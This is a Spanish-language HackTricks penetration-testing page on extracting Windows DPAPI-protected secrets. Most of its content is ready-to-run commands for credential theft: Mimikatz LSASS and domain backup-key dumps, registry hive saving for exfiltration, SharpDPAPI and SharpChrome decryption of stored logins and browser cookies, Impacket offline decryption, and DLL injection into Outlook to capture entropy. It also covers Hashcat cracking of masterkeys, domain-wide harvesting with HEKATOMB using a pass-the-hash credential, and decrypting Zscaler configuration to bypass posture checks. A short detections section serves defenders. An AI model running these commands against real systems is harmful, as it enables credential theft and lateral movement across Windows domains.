# DPAPI - Extracción de contraseñas

{{#include ../../banners/hacktricks-training.md}}



## Qué es DPAPI

La Data Protection API (DPAPI) se utiliza principalmente en el sistema operativo Windows para el **cifrado simétrico de claves privadas asimétricas**, usando secretos del usuario o del sistema como una importante fuente de entropía. Este enfoque simplifica el cifrado para los desarrolladores, ya que les permite cifrar datos con una clave derivada de los secretos de inicio de sesión del usuario o, en el caso del cifrado del sistema, de los secretos de autenticación del dominio del sistema. Así, los desarrolladores no tienen que gestionar por sí mismos la protección de la clave de cifrado.

La forma más habitual de usar DPAPI es mediante las funciones **`CryptProtectData` y `CryptUnprotectData`**, que permiten a las aplicaciones cifrar y descifrar datos utilizando el contexto de seguridad del proceso que ha iniciado sesión. De forma predeterminada, solo el mismo usuario o contexto del sistema que cifró los datos puede descifrarlos.<sup>[[2]](#references)[[3]](#references)</sup>

Estas funciones también aceptan un **parámetro de entropía opcional** que se utiliza durante el cifrado y el descifrado. Para descifrar datos protegidos con entropía opcional, se necesita el mismo valor de entropía.<sup>[[2]](#references)[[6]](#references)</sup>

### Generación de claves de usuario

DPAPI deriva un valor específico del usuario (a menudo llamado **pre-key**) a partir de sus credenciales. La derivación exacta depende de la cuenta y de la versión del sistema operativo. Por ejemplo, Impacket intenta una ruta HMAC-SHA1 basada en el resumen SHA-1 de la contraseña en UTF-16LE, otra basada en el hash MD4/NT de la contraseña y una ruta derivada mediante PBKDF2-SHA256 para Protected Users. Por eso, las herramientas offline a menudo pueden derivar el material necesario a partir de la contraseña en texto plano o de un hash NT disponible.<sup>[[2]](#references)[[10]](#references)</sup>

Esto es especialmente interesante porque, si un atacante puede obtener el hash de la contraseña del usuario, puede:

- **Descifrar cualquier dato cifrado con DPAPI** mediante la clave de ese usuario, sin necesidad de contactar con ninguna API
- Intentar **crackear la contraseña** offline para generar una clave DPAPI válida

DPAPI mantiene una o varias **claves maestras** por usuario, en lugar de crear una nueva clave maestra para cada blob protegido. Cada clave maestra tiene un **GUID** (identificador único global), y un blob cifrado indica qué clave maestra lo protege.<sup>[[2]](#references)</sup>

Las claves maestras se almacenan en el directorio **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, donde `{SID}` es el identificador de seguridad del usuario. El archivo de la clave maestra contiene material protegido por la **pre-key** del usuario y, en el caso de los usuarios de dominio, material de recuperación protegido por una **domain backup key**.<sup>[[2]](#references)</sup>

Ten en cuenta que la **clave de dominio que se usa para cifrar la clave maestra está en los controladores de dominio y nunca cambia**. Por lo tanto, si un atacante tiene acceso al controlador de dominio, puede obtener la domain backup key y descifrar las claves maestras de todos los usuarios del dominio.<sup>[[2]](#references)</sup>

Los blobs cifrados contienen en sus encabezados el **GUID de la clave maestra** que se utilizó para cifrar los datos.

> [!TIP]
> Los blobs cifrados con DPAPI empiezan por **`01 00 00 00`**

Buscar claves maestras:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Así es como se verían varias Master Keys de un usuario:

![Qué es DPAPI - Generación de claves de usuario: Así es como se verían varias Master Keys de un usuario](<../../images/image (1121).png>)

### Generación de claves de máquina/sistema

Esta clave se usa para que la máquina cifre datos. Se basa en el secreto **DPAPI_SYSTEM de LSA**, una clave especial a la que solo puede acceder el usuario SYSTEM. Se usa para cifrar datos a los que el propio sistema necesita acceder, como credenciales a nivel de máquina o secretos de todo el sistema.<sup>[[2]](#references)</sup>

Ten en cuenta que estas claves **no tienen una copia de seguridad en el dominio**, por lo que solo se puede acceder a ellas localmente:

- **Mimikatz** puede acceder a ella volcando los secretos de LSA con el comando: `mimikatz lsadump::secrets`
- El secreto se almacena en el registro, por lo que un administrador podría **modificar los permisos DACL para acceder a él**. La ruta del registro es: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- También es posible extraerlo sin conexión desde los hives del registro. Por ejemplo, como administrador en el destino, guarda los hives y exfiltra los archivos:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Luego, en tu equipo de análisis, recupera el secreto LSA DPAPI_SYSTEM de los hives y úsalo para descifrar blobs DPAPI de ámbito de máquina (por ejemplo, credenciales de aplicaciones protegidas por la máquina o perfiles Wi-Fi):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Ejemplo específico de Veeam DPAPI:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Datos protegidos por DPAPI

Entre los datos personales protegidos por DPAPI se incluyen:

- Credenciales de Windows
- Contraseñas y datos de autocompletado de Internet Explorer y Google Chrome
- Contraseñas de cuentas de correo electrónico y FTP interno para aplicaciones como Outlook y Windows Mail
- Contraseñas de carpetas compartidas, recursos, redes inalámbricas y Windows Vault, incluidas las claves de cifrado
- Contraseñas de conexiones de escritorio remoto, .NET Passport y claves privadas para distintos fines de cifrado y autenticación
- Contraseñas de red administradas por Credential Manager y datos personales de aplicaciones que usan CryptProtectData, como Skype, MSN Messenger y otras
- Blobs cifrados dentro del registro
- ...

Los datos protegidos por el sistema incluyen:
- Contraseñas de Wi-Fi
- ...

Las contraseñas de tareas programadas son una cuestión aparte relacionada con los secretos de LSA. Una tarea registrada con el [tipo de inicio de sesión Password](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) puede almacenar una contraseña para la recuperación de una cuenta de administrador local/SYSTEM; una tarea S4U o con token interactivo no confirma que se haya guardado una contraseña. El principal y el tipo de inicio de sesión de una tarea son indicadores más fiables que el nombre de la cuenta usada para ejecutarla.

### Opciones de extracción de la master key

- Si el usuario tiene privilegios de administrador del dominio, puede acceder a la **clave de backup del dominio** para descifrar todas las master keys de usuario del dominio:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Con privilegios de administrador local, es posible **acceder a la memoria de LSASS** para extraer las claves maestras de DPAPI de todos los usuarios conectados y la clave SYSTEM.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Si el usuario tiene privilegios de administrador local, puede acceder al **secreto DPAPI_SYSTEM de LSA** para descifrar las master keys de la máquina:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Si se conoce la contraseña o el hash NTLM del usuario, se pueden **descifrar directamente las claves maestras del usuario**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Si estás dentro de una sesión como usuario, es posible pedirle al **DC la clave de respaldo para descifrar las claves maestras mediante RPC**. Si eres administrador local y el usuario ha iniciado sesión, podrías **robar su token de sesión**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Listar Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Acceder a datos cifrados con DPAPI

### Buscar datos cifrados con DPAPI

Los archivos protegidos de los usuarios comunes se encuentran en:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Comprueba también cambiando `\Roaming\` por `\Local\` en las rutas anteriores.

Ejemplos de enumeración:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) puede encontrar blobs cifrados con DPAPI en el sistema de archivos, el registro y blobs B64:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Ten en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repo) puede utilizarse para descifrar datos confidenciales protegidos con DPAPI, como cookies.<sup>[[12]](#references)</sup>

#### Recetas rápidas para Chromium/Edge/Electron (SharpChrome)

- Usuario actual, descifrado interactivo de inicios de sesión/cookies guardados (funciona incluso con las cookies app-bound de Chrome 127+, porque la clave adicional se resuelve desde el Credential Manager del usuario cuando se ejecuta en el contexto del usuario):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Análisis sin conexión cuando solo tienes archivos. Primero extrae la clave de estado AES del "Local State" del perfil y luego úsala para descifrar la base de datos de cookies:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Triage en todo el dominio/remoto cuando tienes la clave de backup de dominio de DPAPI (PVK) y admin en el host objetivo:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Si tienes la prekey/credkey DPAPI de un usuario (de LSASS), puedes omitir el cracking de contraseñas y descifrar directamente los datos del perfil:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Notas
- Las versiones más recientes de Chrome/Edge pueden almacenar ciertas cookies con cifrado «App-Bound». No es posible descifrar esas cookies específicas sin conexión sin la clave adicional de App-Bound; ejecuta SharpChrome en el contexto del usuario objetivo para recuperarla automáticamente. Consulta la publicación del blog de seguridad de Chrome mencionada abajo.<sup>[[5]](#references)</sup>

### Claves de acceso y datos

- **Usa SharpDPAPI** para obtener credenciales de archivos cifrados con DPAPI de la sesión actual:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Obtener información de credenciales** como los datos cifrados y el guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Acceder a las masterkeys**:

Descifra una masterkey de un usuario solicitando la **domain backup key** del dominio mediante RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

La herramienta **SharpDPAPI** también admite estos argumentos para descifrar masterkey (observa que es posible usar `/rpc` para obtener la clave de backup del dominio, `/password` para usar una contraseña en texto plano o `/pvk` para especificar un archivo de clave privada de dominio DPAPI...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Descifrar datos usando una masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

La herramienta **SharpDPAPI** también admite estos argumentos para descifrar `credentials|vaults|rdg|keepass|triage|blob|ps` (observa que es posible usar `/rpc` para obtener la clave de copia de seguridad del dominio, `/password` para usar una contraseña en texto plano, `/pvk` para especificar un archivo de clave privada de dominio de DPAPI y `/unprotect` para usar la sesión del usuario actual...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Usar directamente una prekey/credkey de DPAPI (no se necesita contraseña)

Si puedes hacer dump de LSASS, Mimikatz suele exponer una clave de DPAPI por inicio de sesión que se puede usar para descifrar las masterkeys del usuario sin conocer la contraseña en texto plano. Pasa este valor directamente a las herramientas:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Descifrar algunos datos usando la **sesión del usuario actual**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Descifrado offline con Impacket dpapi.py

Si tienes el SID y la contraseña del usuario víctima (o el hash NT), puedes descifrar las masterkeys de DPAPI y los blobs de Credential Manager completamente offline usando dpapi.py de Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifica los artefactos en disco:
  - Blob(s) de Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
  - Masterkey correspondiente: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Si las herramientas de transferencia de archivos dan problemas, codifica los archivos en base64 en el host y copia la salida:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Descifra el masterkey con el SID y la contraseña/hash del usuario:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Usa la masterkey descifrada para descifrar el blob de credenciales:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Este flujo de trabajo suele recuperar credenciales de dominio guardadas por aplicaciones que usan Windows Credential Manager, incluidas cuentas administrativas (p. ej., `*_adm`).

---

### Gestión de entropía opcional («entropía de terceros»)

Algunas aplicaciones pasan un valor adicional de **entropía** a `CryptProtectData`. Sin este valor, el blob no se puede descifrar, aunque se conozca la masterkey correcta. Por lo tanto, obtener la entropía es esencial al buscar credenciales protegidas de esta manera (p. ej., Microsoft Outlook y algunos clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) es una DLL en modo usuario que intercepta las funciones DPAPI dentro del proceso objetivo y registra de forma transparente cualquier entropía opcional proporcionada. Al ejecutar EntropyCapture en modo **DLL-injection** contra procesos como `outlook.exe` o `vpnclient.exe`, se genera un archivo que asocia cada búfer de entropía con el proceso y el blob que lo invocaron. Después, la entropía capturada se puede proporcionar a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) para descifrar los datos.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Cracking de masterkeys offline (Hashcat & DPAPISnoop)

Microsoft introdujo un formato de masterkey **context 3** a partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (diciembre de 2023) añadió los hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) y **22102** (context 3), que permiten crackear las contraseñas de usuario directamente desde el archivo masterkey mediante GPU. Por tanto, los atacantes pueden realizar ataques de word-list o brute-force sin interactuar con el sistema objetivo.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatiza el proceso:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

La herramienta también puede analizar blobs de Credential y Vault, descifrarlos con claves crackeadas y exportar las contraseñas en texto claro.<sup>[[8]](#references)</sup>


### Acceder a los datos de otras máquinas

En **SharpDPAPI y SharpChrome**, puedes indicar la opción **`/server:HOST`** para acceder a los datos de una máquina remota. Por supuesto, debes poder acceder a esa máquina. En el siguiente ejemplo, se supone que se conoce la **clave de cifrado de la copia de seguridad del dominio**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### Conexión a la base de datos del servidor de informes de SSRS

En un host de SQL Server Reporting Services (SSRS), `RSReportServer.config` puede contener un `<Dsn>` cifrado para la base de datos del servidor de informes.<sup>[[15]](#references)</sup> SSRS protege estos ajustes de conexión con una **clave a nivel de máquina local**; en cambio, las credenciales de los orígenes de datos externos de los informes se cifran en la base de datos del servidor de informes con su clave simétrica.<sup>[[14]](#references)</sup>

En el caso descrito, el atacante extrajo el `Dsn` e intentó descifrar sus bytes decodificados de Base64 con `ProtectedData.Unprotect` y el ámbito `LocalMachine`.<sup>[[13]](#references)</sup>

Con acceso de lectura al archivo de configuración de SSRS en la máquina que lo protegió, localiza la ruta real de la instancia e inspecciona el valor. La ruta del ejemplo corresponde a SSRS 2017 y versiones posteriores; la protección a nivel de máquina no requiere el contexto de la cuenta de servicio de SSRS.<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

Una `Dsn` vacía o ausente no le da nada que descifrar a este método.<sup>[[15]](#references)</sup> Una cadena de conexión descifrada **no** necesariamente contiene una contraseña reutilizable: SSRS puede usar su cuenta de servicio, o una cuenta de dominio configurada puede tener parámetros `LogonUser`, `LogonDomain` y `LogonCred` separados.<sup>[[15]](#references)</sup> Copiar solo el valor cifrado a otra máquina no le proporciona a esa máquina la clave de protección del host de origen.<sup>[[14]](#references)</sup>

Para otras vías de acceso a SQL Server, consulta [MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/).

## Otras herramientas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y equipos del directorio LDAP, así como la extracción de la clave de backup del controlador de dominio mediante RPC. Después, el script resuelve las direcciones IP de todos los equipos y ejecuta smbclient en todos ellos para recuperar todos los blobs DPAPI de todos los usuarios y descifrarlo todo con la clave de backup del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista de equipos extraída de LDAP puedes encontrar todas las subredes, ¡aunque no las conocieras!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede hacer dump automáticamente de los secretos protegidos por DPAPI. La versión 2.x introdujo:<sup>[[9]](#references)</sup>

* Recopilación paralela de blobs de cientos de hosts
* Análisis de masterkeys de **context 3** e integración automática con Hashcat para cracking
* Compatibilidad con las cookies cifradas "App-Bound" de Chrome (consulta la siguiente sección)
* Un nuevo modo **`--snapshot`** para sondear repetidamente los endpoints y comparar los blobs creados recientemente

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un parser de C# para archivos de masterkey/credenciales/vault que puede generar formatos de Hashcat/JtR y, opcionalmente, ejecutar cracking automáticamente. Es totalmente compatible con los formatos de masterkey de máquina y usuario hasta Windows 11 24H1.<sup>[[8]](#references)</sup>


## Detecciones comunes

- Acceso a archivos en `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` y otros directorios relacionados con DPAPI.
    - Especialmente desde un recurso compartido de red como **C$** o **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** o herramientas similares para acceder a la memoria de LSASS o hacer dump de masterkeys.
- Evento **4662**: *Se realizó una operación en un objeto* – puede correlacionarse con el acceso al objeto **`BCKUPKEY`**.
- Evento **4673/4674** cuando un proceso solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades y cambios del ecosistema de 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (noviembre de 2023). Un atacante con acceso a la red podía engañar a un miembro del dominio para que recuperara una clave de backup de DPAPI maliciosa, lo que permitía descifrar las masterkeys de los usuarios. Se corrigió en la actualización acumulativa de noviembre de 2023; los administradores deben asegurarse de que los controladores de dominio y las estaciones de trabajo estén completamente actualizados.<sup>[[4]](#references)</sup>
* El cifrado de cookies “App-Bound” de Chrome 127 (julio de 2024) reemplazó la protección anterior, que dependía solo de DPAPI, por una clave adicional almacenada en **Credential Manager** del usuario. El descifrado offline de cookies ahora requiere tanto la masterkey de DPAPI como la **clave app-bound envuelta en GCM**. SharpChrome v2.3 y DonPAPI 2.x pueden recuperar la clave adicional cuando se ejecutan en el contexto del usuario.<sup>[[5]](#references)</sup>


### Caso práctico: Zscaler Client Connector – Entropía personalizada derivada del SID

Zscaler Client Connector almacena varios archivos de configuración en `C:\ProgramData\Zscaler` (p. ej., `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada archivo está cifrado con **DPAPI (ámbito de máquina)**, pero el proveedor aporta **entropía personalizada** que se *calcula en tiempo de ejecución* en vez de almacenarse en disco.<sup>[[1]](#references)</sup>

La entropía se reconstruye a partir de dos elementos:

1. Un secreto codificado directamente en `ZSACredentialProvider.dll`.
2. El **SID** de la cuenta de Windows a la que pertenece la configuración.

El algoritmo implementado por la DLL equivale a:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Como el secreto está integrado en una DLL que se puede leer desde el disco, **cualquier atacante local con privilegios SYSTEM puede volver a generar la entropía para cualquier SID** y descifrar los blobs sin conexión:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

El descifrado revela la configuración JSON completa, incluidas todas las **comprobaciones de postura del dispositivo** y sus valores esperados: información muy valiosa al intentar eludir las comprobaciones del lado del cliente.

> CONSEJO: los otros artefactos cifrados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) están protegidos con DPAPI **sin** entropía (16 bytes con valor cero). Por lo tanto, se pueden descifrar directamente con `ProtectedData.Unprotect` una vez obtenidos los privilegios de SYSTEM.

## References

- [1] [Synacktiv – ¿Deberías confiar en tu zero trust? Cómo eludir las comprobaciones de postura de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Secretos de DPAPI. Análisis de seguridad y recuperación de datos en DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lectura de secretos cifrados con DPAPI mediante Mimikatz y C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Vulnerabilidad de suplantación de Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Mejorar la seguridad de las cookies de Chrome en Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: extracción sencilla de la entropía opcional de DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Notas de la versión de hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – repositorio de GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – página del proyecto en PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: abuso de ACL de AD, cracking de Argon2 de KeePassXC y descifrado de DPAPI hasta obtener acceso de administrador al DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – uso y opciones](https://github.com/GhostPack/SharpDPAPI)
- [13] [CyberStrikeAI en la práctica: uso de la IA en ataques reales contra organizaciones](https://securelist.com/tr/cyberstrikeai-attacks/121715)
- [14] [Microsoft Learn - Almacenar datos cifrados del servidor de informes](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn - Archivo de configuración RSReportServer.config](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
